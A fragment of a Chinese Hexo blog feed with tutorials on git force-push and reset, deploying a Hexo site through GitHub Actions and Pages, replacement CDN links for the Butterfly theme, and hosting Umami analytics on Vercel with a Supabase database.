<p>不建议强制覆盖本地，除非放弃本地的内容（包括已修改但暂未发布到远程仓库的内容）</p>
</blockquote>
<p>拉取更新到本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch --all</span><br></pre></td></tr></table></figure>

<p>拉取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull origin main</span><br></pre></td></tr></table></figure>

<p>重置本地暂存区&#x2F;仓库，使用远程仓库的origin&#x2F;main替换本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard origin/main</span><br></pre></td></tr></table></figure>

<h1 id="git强制推送本地仓库覆盖远程仓库"><a href="#git强制推送本地仓库覆盖远程仓库" class="headerlink" title="git强制推送本地仓库覆盖远程仓库"></a>git强制推送本地仓库覆盖远程仓库</h1><p>这是git push –force的简写形式。使用这个命令同样会强制推送本地仓库的提交到远程仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -f</span><br></pre></td></tr></table></figure>

<p>这个命令是比较安全的强制推送命令。它会检查远程仓库的状态，如果在你上一次拉取和推送之后没有其他人对远程仓库进行了修改，那么推送将会成功。这个命令可以确保不会破坏其他人的工作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push -force-with-lease</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>tools</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>github actions + pages, 托管hexo源码和自动部署网站</title>
    <url>/posts/c842eb90/</url>
    <content><![CDATA[<h1 id="新建两个仓库"><a href="#新建两个仓库" class="headerlink" title="新建两个仓库"></a>新建两个仓库</h1><h2 id="一个公开仓库"><a href="#一个公开仓库" class="headerlink" title="一个公开仓库"></a>一个公开仓库</h2><p><a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io">https://github.com/用户名/用户名.github.io</a></p>
<p>公开仓库必须按以上格式新建，因为Github Action的最下面的push格式已固定好</p>
<h2 id="一个私有仓库"><a href="#一个私有仓库" class="headerlink" title="一个私有仓库"></a>一个私有仓库</h2><p><a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E5%90%8D.git">https://github.com/用户名/私有仓库名.git</a></p>
<p>我们需要创建一个用来存放<code>Hexo</code>博客源码的私有仓库</p>
<p><img src="/img/githubaction/1.webp" alt="img"></p>
<p>创建完成后，需要把博客的源码<code>push</code>到这里。首先获取远程仓库地址，此处虽然<code>SSH</code>和<code>HTTPS</code>均可。<code>SSH</code>在绑定过<code>ssh key</code>的设备上无需再输入密码，<code>HTTPS</code>则需要输入密码，但是<code>SSH</code>偶尔会遇到端口占用的情况。请自主选择。</p>
<p><img src="/img/githubaction/2.webp" alt="img"></p>
<p>这里之所以是私有仓库，是因为在接下来的配置中会用到<code>Token</code>，如果<code>Token</code>被盗用，别人可以肆意操作你的github仓库内容，为了避免这一风险，才选择的博客源码闭源。</p>
<h1 id="使用ssh模式"><a href="#使用ssh模式" class="headerlink" title="使用ssh模式"></a>使用ssh模式</h1><p>1、检查自己<code>git config</code>是否配置<br>首先查看自己的<code>git config</code>，可以通过命令行<code>git config --global --list</code>查看</p>
<p><img src="/img/githubaction/3.webp" alt="在这里插入图片描述"></p>
<p>如果没有user.name和user.email没有值的话，我们也可以先配置，命令行配置如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;这里换上你的用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;这里换上你的邮箱&quot;</span></span><br></pre></td></tr></table></figure>

<p>当然，你也可以在电脑内查看文件，以windows电脑为例，路径大概是C:\Users\Administrator，之后的ssh key也是生成在这个目录下。</p>
<p>2、新建ssh key<br>进入路径C:\Users\Administrator，命令行输入如下命令，执行生成你的ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;这里换上你的邮箱&quot;</span></span><br></pre></td></tr></table></figure>


<p>回车后会询问你ssh key生成的路径、是否需要密码，不需要的话直接留空回车即可。</p>
<p>生成成功后，该路径下会出现如下文件</p>
<p><img src="/img/githubaction/4.webp" alt="在这里插入图片描述"></p>
<p><code>id_rsa.pub</code>就是公钥文件，后续会使用</p>
<p>3、GitHub关联ssh<br>进入GitHub的个人设置，找到【SSH and GPG keys】，然后点击新增SSH，进入如下界面，title输入你对于当前SSH key的备注，下面的key就粘贴上一步生成的<code>id_rsa.pub</code>内的内容</p>
<p><img src="/img/githubaction/5.webp" alt="在这里插入图片描述"></p>
<p>操作完成你就能开心的使用SSH模式操作git了。</p>
<p>4、使用SSH<br>以GitHub为例，我们在查看code的时候如下图，使用SSH就好了</p>
<p><img src="/img/githubaction/6.webp" alt="在这里插入图片描述"></p>
<p>如果是之前项目用的HTTPS，现在要改成SSH，进行上面的操作后，我们可以直接切换origin的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote set-url origin git@github.com:你的仓库.git</span><br></pre></td></tr></table></figure>

<h1 id="获取Token"><a href="#获取Token" class="headerlink" title="获取Token"></a>获取Token</h1><p>为了确保交由<code>Github Action</code>来持续部署时，<code>Github Action</code>具备足够的权限来进行<code>hexo deploy</code>操作,需要先获取<code>Token</code>。</p>
<p>访问<a href="https://github.com/settings/tokens">Github-&gt;头像（右上角）-&gt;Settings-&gt;Developer Settings-&gt;Personal access tokens</a>-&gt;generate new token,创建的<code>Token</code>名称随意，但必须勾选<code>repo</code>项和<code>workflows</code>项。<br><img src="/img/githubaction/7.webp" alt="img"><br><img src="/img/githubaction/8.webp" alt="img"><br><img src="/img/githubaction/9.webp" alt="img"></p>
<p><code>token</code>只会显示这一次，之后将无法查看，所以务必保证你已经记录下了<code>Token</code>。之后如果忘记了就只能重新生成重新配置了。</p>
<h1 id="配置Github-Action"><a href="#配置Github-Action" class="headerlink" title="配置Github Action"></a>配置Github Action</h1><ol>
<li><p>在本地博客根目录新建 <code>.github</code> 文件夹,注意开头是有个 . </p>
<p>的。然后在 <code>.github</code> 内新建 <code>workflows</code> 文件夹，再在 <code>workflows</code> </p>
<p>文件夹内新建 <code>autodeploy.yml</code> ,在 博客根目录&#x2F;.github&#x2F;workflows&#x2F;autodeploy.yml 里面输入</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当有改动推送到main分支时，启动Action</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">自动部署</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">release:</span></span><br><span class="line">    <span class="attr">types:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">published</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">检查分支</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">ref:</span> <span class="string">main</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Node</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">&quot;18.17&quot;</span> <span class="comment">#action使用的node版本，建议大版本和本地保持一致。可以在本地用node -v查询版本号。</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        export TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"><span class="string">        npm install hexo-cli -g</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">缓存</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/cache@v1</span></span><br><span class="line">      <span class="attr">id:</span> <span class="string">cache</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">        <span class="attr">key:</span> <span class="string">$&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;**/package-lock.json&#x27;)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装依赖</span></span><br><span class="line">      <span class="attr">if:</span> <span class="string">steps.cache.outputs.cache-hit</span> <span class="type">!=</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        npm install --save</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">生成静态文件</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        hexo clean</span></span><br><span class="line"><span class="string">        hexo generate</span></span><br><span class="line"><span class="string">        gulp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">部署</span> <span class="comment">#此处main:main 指从本地的main分支提交到远程仓库的main分支，若远程仓库没有对应分支则新建一个。如有其他需要，可以根据自己的需求更改。</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        cd ./public</span></span><br><span class="line"><span class="string">        git init</span></span><br><span class="line"><span class="string">        git config --global user.name &#x27;$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">        git config --global user.email &#x27;$&#123;&#123; secrets.GITHUBEMAIL &#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">        git add .</span></span><br><span class="line"><span class="string">        git commit -m &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; $(date +&quot;%Z %Y-%m-%d %A %H:%M:%S&quot;) Updated By Github Actions&quot;</span></span><br><span class="line"><span class="string">        git push --force --quiet &quot;https://$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;:$&#123;&#123; secrets.GITHUBTOKEN &#125;&#125;@github.com/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;.github.io.git&quot; master:main</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意最后一行的<code>master:master</code>指从本地的master分支提交到远程仓库的master分支,需要根据你自己的实际情况进行调整。本地分支可以在git bash中看到。线上分支可以在提交仓库中查看。因为“政治正确”的原因，github在2020年10月将默认分支改为main。而git软件在本地默认创建的分支依然是master，所以若你线上仓库默认分支是main，这里应该写成master:main，表示从本地的master推送到远程的main。</p>
</blockquote>
</li>
<li><p>之后需要自己到仓库的Settings-&gt;Secrets-&gt;actions 下添加环境变量，变量名参考脚本中出现的，依次添加。<br><img src="/img/githubaction/10.webp" alt="img"><br>例如，需要部署在githubpage上，那么脚本中必要的变量为<br><code>GITHUBUSERNAME</code>、<code>GITHUBEMAIL</code>、<code>GITHUBTOKEN</code>，因此添加这三条变量。变量具体内容释义可以查看本文开头。</p>
<p><img src="/img/githubaction/11.webp" alt="img"></p>
</li>
</ol>
<h1 id="重新设置远程仓库和分支"><a href="#重新设置远程仓库和分支" class="headerlink" title="重新设置远程仓库和分支"></a>重新设置远程仓库和分支</h1><ol>
<li><p>删除或者先把<code>博客根目录/themes/butterfly/.git</code>移动到非博客文件夹目录下,原因是主题文件夹下的<code>.git</code>文件夹的存在会导致其被识别成子项目，从而无法被上传到源码仓库。</p>
</li>
<li><p>在博客根目录路径下运行指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init <span class="comment">#初始化</span></span><br><span class="line">git remote add origin git@github.com:[GithubUsername]/[SourceRepo].git <span class="comment">#[SourceRepo]为存放源码的github私有仓库</span></span><br><span class="line">git checkout -b main <span class="comment"># 切换到master分支，</span></span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"><span class="comment"># 如果不是，后面的所有设置的分支记得保持一致</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加屏蔽项</p>
<p>因为能够使用指令进行安装的内容不包括在需要提交的源码内，所有我们需要将这些内容添加到屏蔽项，表示不上传到github上。这样可以显著减少需要提交的文件量和加快提交速度。</p>
<p>打开博客根目录<code>/.gitignore</code></p>
<p>,输入以下内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.deploy_git*/</span><br><span class="line">.idea</span><br><span class="line">themes/butterfly/.git</span><br></pre></td></tr></table></figure>

<p>如果不是<code>butterfly</code>主题，记得替换最后一行内容为你自己当前使用的主题。</p>
</li>
<li><p>之后再运行git提交指令，将博客源码提交到github上。牢记下方的三行指令，以后都是通过这个指令进行提交。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;github action update&quot;</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果出现 Updates were rejected because the remote contains work that you do，产生的原因是本地仓库与线上仓库的内容不匹配，或者说本地相对于远程不是最新，先pull更新本地，再把自己的push上去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status　　//查看状态</span><br><span class="line">git init 　　 //初始化仓库</span><br><span class="line">git add .(文件name) 　　//添加文件到本地仓库</span><br><span class="line">git commit -m &quot;注释&quot; 　　//添加文件描述信息</span><br><span class="line">git remote add origin git@github.com:[GithubUsername]/[SourceRepo].git 　　//链接远程仓库，创建主分支</span><br><span class="line">git pull origin main　　 // 把本地仓库的变化连接到远程仓库主分支</span><br><span class="line">git push -u origin main　　 //把本地仓库的文件推送到远程仓库</span><br></pre></td></tr></table></figure>
</li>
<li><p>此时你的主题文件夹若已经被正常上传，并且你也添加了主题文件夹下的.git文件夹的屏蔽项。那你可以考虑把第二步移走或删除的<code>.git</code>放回来</p>
</li>
<li><p>如何更改仓库链接</p>
<p>在博客根目录下启动终端，使用git指令重设仓库地址。这样在新建仓库，我们仍旧可以保留珍贵的commit history，便于版本回滚。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote <span class="built_in">rm</span> origin <span class="comment"># 删除原有仓库链接</span></span><br><span class="line">git remote add origin git@github.com:[GithubUsername]/[SourceRepo].git <span class="comment">#[SourceRepo]为新的存放源码的github私有仓库</span></span><br><span class="line">git checkout -b main <span class="comment"># 切换到master分支，</span></span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"><span class="comment"># 如果不是，后面的所有设置的分支记得保持一致</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;github action update&quot;</span></span><br><span class="line">git push origin main</span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>可能遇到的bug</p>
<p>因为butterfly主题文件夹下的 <code>.git</code> 文件夹的存在，那么主题文件夹会被识别子项目。从而无法被上传到源码仓库。若是遇到添加屏蔽项，但是还是无法正常上传主题文件夹的情况。请先将本地源码中的themes文件夹移动到别的目录下。然后<code>commit</code>一次。接着将themes文件夹移动回来，再<code>commit</code>一次。</p>
<blockquote>
<p>要是还不行，那就删了<code>butterfly</code>主题文件夹下的<code>.git</code>文件夹，然后再重复上述的<code>commit</code>操作。</p>
</blockquote>
</li>
</ol>
<h1 id="查看部署情况"><a href="#查看部署情况" class="headerlink" title="查看部署情况"></a>查看部署情况</h1><p>此时，打开GIthub存放源码的私有仓库，找到action。<br><img src="/img/githubaction/12.webp" alt="img"><br>根据刚刚的Commit记录找到相应的任务<br><img src="/img/githubaction/13.webp" alt="img"><br>点击Deploy查看部署情况</p>
<p><img src="/img/githubaction/14.webp" alt="img">若全部打钩，顺利自动部署</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>hexo</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>hexo</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo butterfly主题自定义cdn代替jsDelivr提升访问速度</title>
    <url>/posts/67b0bef5/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>使用错误的cdn会导致博客服务无法访问，访问速度过慢的问题。因为众所周知的原因jsdelivr无法使用了，但是替换cdn不知道替换成什么比较好。使用新版butterfly的用户可以切换成本地模式，但是如果是旧版butterfly用户的话或者新版想要提升速度就需要第三方的cdn了。</p>
<h1 id="替换方式"><a href="#替换方式" class="headerlink" title="替换方式"></a>替换方式</h1><p>更改博客配置文件themes&#x2F;butterfly&#x2F;_config.yml</p>
<p>新版butterfly<br>更改cdn的option配置项</p>
<p><img src="/img/cdn-option.webp" alt="微信截图_20230806231047"></p>
<p>更改配置项</p>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>我这里只列出我在用的cdn，我没有用到的cdn可以在评论中留言，有时间我会补充。</p>
<p>main</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cdn.staticfile.org/hexo-theme-butterfly/4.9.0/js/main.min.js</span><br></pre></td></tr></table></figure>

<p>utils</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cdn.staticfile.org/hexo-theme-butterfly/4.9.0/js/utils.min.js</span><br></pre></td></tr></table></figure>

<p>translate（在用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cdn.staticfile.org/hexo-theme-butterfly/4.9.0/js/tw_cn.min.js</span><br></pre></td></tr></table></figure>

<p>local_search</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cdn.staticfile.org/hexo-theme-butterfly/4.9.0/js/search/local-search.min.js</span><br></pre></td></tr></table></figure>

<p>jquery</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js</span><br></pre></td></tr></table></figure>

<p>pjax</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lib.baomitu.com/pjax/0.2.8/pjax.min.js</span><br><span class="line">https://npm.elemecdn.com/pjax@0.2.8/pjax.min.js</span><br></pre></td></tr></table></figure>

<p>sharejs（在用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js</span><br><span class="line">https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css</span><br></pre></td></tr></table></figure>

<p>gittalk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitalk: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/gitalk/1.7.2/gitalk.min.js</span><br><span class="line">gitalk_css: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/gitalk/1.7.2/gitalk.min.css</span><br></pre></td></tr></table></figure>

<p>valine</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/valine/1.4.16/Valine.min.js</span><br></pre></td></tr></table></figure>

<p>disqusjs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disqusjs: https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/disqusjs/1.3.0/disqus.js</span><br><span class="line">或</span><br><span class="line">disqusjs_css: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/disqusjs/1.3.0/disqusjs.css</span><br></pre></td></tr></table></figure>

<p>twikoo（在用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/twikoo/1.4.18/twikoo.all.min.js</span><br></pre></td></tr></table></figure>

<p>waline</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/waline/1.5.4/Waline.min.js</span><br></pre></td></tr></table></figure>

<p>algolia</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">algolia_js: https://cdn1.tianli0.top/npm/js-heo@1.0.11/algolia/algolia.js</span><br><span class="line">algolia_search: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/instantsearch.js/2.10.5/instantsearch.min.js</span><br><span class="line">algolia_search_css: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/instantsearch.js/2.10.5/instantsearch.min.css</span><br></pre></td></tr></table></figure>

<p>lazyload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js</span><br></pre></td></tr></table></figure>

<p>instantpage（在用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js</span><br></pre></td></tr></table></figure>

<p>typed（在用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/typed.js/2.0.12/typed.min.js</span><br></pre></td></tr></table></figure>

<p>pangu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/pangu/4.0.7/pangu.min.js</span><br></pre></td></tr></table></figure>

<p>fancybox</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fancybox_css: https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.css</span><br><span class="line">fancybox: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.js</span><br><span class="line">或</span><br><span class="line">fancybox_css: https://cdn.staticfile.org/fancyapps-ui/5.0.19/fancybox/fancybox.min.css</span><br><span class="line">fancybox: https://cdn.staticfile.org/fancyapps-ui/5.0.19/fancybox/fancybox.umd.min.js</span><br></pre></td></tr></table></figure>

<p>medium_zoom</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/medium-zoom/1.0.6/medium-zoom.min.js</span><br></pre></td></tr></table></figure>

<p>snackbar（在用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snackbar_css: https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/node-snackbar/0.1.16/snackbar.min.css</span><br><span class="line">snackbar: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/node-snackbar/0.1.16/snackbar.min.js</span><br></pre></td></tr></table></figure>

<p>fontawesome</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css</span><br><span class="line">或</span><br><span class="line">https://npm.elemecdn.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css</span><br></pre></td></tr></table></figure>

<p>translate</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cdn1.tianli0.top/npm/js-heo@1.0.6/translate/tw_cn.js</span><br></pre></td></tr></table></figure>

<p>aplayer</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aplayer_css: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css</span><br><span class="line">aplayer_js: https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js</span><br></pre></td></tr></table></figure>

<p>justifiedGallery</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">justifiedGallery_js: https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js</span><br><span class="line">justifiedGallery_css: https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/justifiedGallery/3.8.1/css/justifiedGallery.min.css</span><br></pre></td></tr></table></figure>

<p>CDN选择原则<br>优先使用字节跳动的cdn，如果没有则使用elemecdn。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
        <category>cdn</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>cdn</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Supabase的PostgreSQL数据库连接Vercel部署Umami，搭建一个免费的博客流量分析服务</title>
    <url>/posts/736f0212/</url>
    <content><![CDATA[<p>开源的网站统计服务——Umami。</p>
<p><img src="/img/supabase-umami/1.webp" alt="l7XlsnY"></p>
<p>根据官网介绍，Umami 是一款简单、易用、美观、轻量、快速、隐私、安全的开源免费网站统计工具，从部署到使用，都是简单、快速，体验也很满意。</p>
<p>官方文档介绍了多种部署方式，包括使用自己服务器，或者第三方平台，例如 Netlify、Heroku、Railway 等等，有些第三方平台一般都不提供数据库服务，本文将使用 Vercel 部署应用，Supabse、Heroku 两种方式提供数据库服务。</p>
<p>在使用前，先注册并登录好 GitHub、Vercel、Supabase或者Heroku 三个平台，并在 GitHub 平台 Fork Umami 的项目仓库。</p>
<p>GitHub：<a href="https://github.com/umami-software/umami">https://github.com/umami-software/umami</a><br>Vercel：<a href="https://vercel.com/">https://vercel.com/</a><br>Supabase：<a href="https://supabase.com/">https://supabase.com/</a></p>
<h1 id="1、在-Supabase-建立数据库"><a href="#1、在-Supabase-建立数据库" class="headerlink" title="1、在 Supabase 建立数据库"></a>1、在 Supabase 建立数据库</h1><p>在官网选择 Free 方案，进入 Create a new project 页面，按要求填写相关内容。Name 填写任意项目名，Database Password 可以使用下方工具 Generate a password 生成，并保存到记事本备用。</p>
<p><img src="/img/supabase-umami/2.webp" alt="8IlGD7D"></p>
<p>等待数据库建立，需要几分钟的时间。</p>
<p>建立之后，点击左下方的 Project Settings，选择 Database，找到 Connection string 中的 URL 一栏，复制内容，并将 [YOUR-PASSWORD] 替换为上一步生成的密码，稍后会用到。</p>
<p><img src="/img/supabase-umami/3.webp" alt="XCjcW6h"></p>
<p>Supabase 平台的操作就结束了。</p>
<h1 id="2、在-Vercel-部署-Umami"><a href="#2、在-Vercel-部署-Umami" class="headerlink" title="2、在 Vercel 部署 Umami"></a>2、在 Vercel 部署 Umami</h1><p>登录 Vercel 之后，点击右上角 Add New Project，并导入事先 Fork 的项目仓库。</p>
<p><img src="/img/supabase-umami/4.webp" alt="b8zxWkC"></p>
<p><img src="/img/supabase-umami/5.webp" alt="pleORoA"></p>
<p>在 Configure Project 中需要设置两个环境变量（Environment Variables）。</p>
<p><img src="/img/supabase-umami/6.webp" alt="KikUACO"></p>
<p>分别添加 </p>
<p><code>DATABASE_URL</code></p>
<p><code>HASH_SALT</code></p>
<p><code>TRACKER_SCRIPT_NAME</code></p>
<p>DATABASE_URL 是上一步在 Subabase 复制的 URL，记得替换自己的 Password；<br>HASH_SALT 需要自己随意生成一长串字符串。</p>
<p>使用官方的脚本名称，可能会被一些过滤规则拦截，因此我们可以自定义脚本名称，实现更准确地网站数据追踪。</p>
<p>配置自定义脚本名称，官方也提供了便捷的修改方式，可以在 Vercel 中已经部署的 umami 服务中增加 TRACKER_SCRIPT_NAME 环境变量，配置为自定义名称。</p>
<p><img src="/img/supabase-umami/7.webp" alt="qELl3Vb"></p>
<p>最后点击 Deploy，等待两分钟。</p>
<p><img src="/img/supabase-umami/8.webp" alt="iz2rM70"></p>
<h1 id="3、自定义域名"><a href="#3、自定义域名" class="headerlink" title="3、自定义域名"></a>3、自定义域名</h1><p>由于 Vercel 提供的域名在大陆无法访问，所以如果是想大陆流畅访问，建议绑定一个自己的域名。</p>
<p>1、在自有域名的 DNS 服务中添加一条记录，选择 CNAME 类型转发，记录值填写为：<code>cname.vercel-dns.com</code></p>
<p>2、然后在 Vercel 中找到 umami 项目，点击 Settings 标签卡，跳转页面后点击左侧的 Domains 菜单项，输入你自己定义的域名点击 Add 按钮即可。</p>
<p><img src="/img/supabase-umami/9.webp" alt="BfZYoev"></p>
<h1 id="4、使用-Umami"><a href="#4、使用-Umami" class="headerlink" title="4、使用 Umami"></a>4、使用 Umami</h1><p>按照上述步骤，Umami 已经部署成功了，点击 Dashboard 或分配的 Vercel 域名访问服务，可以看到 umami 的登录界面。</p>
<p><img src="/img/supabase-umami/10.webp" alt="2xQiUHi"></p>
<p>默认用户名和密码分别是 admin 和 umami ，进入后台可以修改密码、设置语言，完成基础帐号配置后，点击侧边栏网站 Tab，点击添加网站，然后就可以添加网站了。</p>
<p><img src="/img/supabase-umami/11.webp" alt="d0DvDhe"></p>
